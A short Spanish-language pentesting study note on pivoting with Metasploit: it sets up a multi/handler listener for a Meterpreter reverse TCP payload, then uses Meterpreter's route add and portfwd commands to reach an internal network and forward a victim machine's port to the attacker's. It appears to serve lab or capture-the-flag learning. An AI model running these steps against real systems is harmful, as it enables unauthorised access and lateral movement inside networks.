# Pivoting con Metasploit

Tags: #Pivoting #Metasploit #PortForwarding 

```bash 
1. # Usaremos el Multihandler para tener una sesion con Meterpreter y hacer Port Porwarding (Linux - Linux)
❯ msfconsole -q                     # q = Quitar el banner de inicio

	❯ use multi/handler            # Así nos pondremos en escucha en nuestra maquina de atacante              
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 443
	❯ set payload linux/x86/meterpreter/reverse_tcp
	❯ run
```

```bash 
2. Buscaremos la manera de enviarnos una Revershell a nuestra maquina de atacante desde la maquina victima 
```

```bash 
3. # Despues de tener la sesión, hacemos lo siguiente con los comandos de Meterpreter
meterpreter❯

	❯ ipconfig             # Para ver todas las IP en la maquina victima 
	❯ Ctrl + z             # Para pasar la sesion a segundo plano


4. # Redireccionaremos todo el trafico de una interfaz a nuestra maquina de atacante  
msf6 post(multi/manage/shell_to_meterpreter) ❯ route add <IP> <Mask> <ID>
	# IP = Colocamos la direccion IP de la interfaz a la que no llegamos 
	# Mask = Colocamos la mascara de red de esa IP (255.255.255.0)
	# ID = Colocamos el ID de la sesion que esta en segundo plano 
```

```bash 
5. # Ahora haremos el Port Forwarding (Traernos un puerto especifico a nuestra maquina de atacante)
msf6 post(multi/manage/shell_to_meterpreter) ❯ sessions -l                  # l = ele
msf6 post(multi/manage/shell_to_meterpreter) ❯ sessions -i <ID>             # ID = Identificador de la sesion 

# Regresamos al Meterpreter 
meterpreter❯ portfwd add -l <PORT_Atacante> -p <PORT_Victima> -r <IP_Victima>
	# l = ele
	# Port_Atacante = Puerto que vamos a abrir de nuestra maquina de atacante 
	# IP = Colocamos la IP de la maquina victima 
	# PORT_Victima = Puerto que nos vamos a traer de la maquina victima 

6. # En nuestro navegador web podemos cisualizar el puerto que nos hemos traido, esto si ha sido un puerto web (80)
127.0.0.1:<PORT>
	# PORT = Es el puerto que hemos puesto en el comando anterior que ibamos a abrir de nuestra maquina de atacante 
```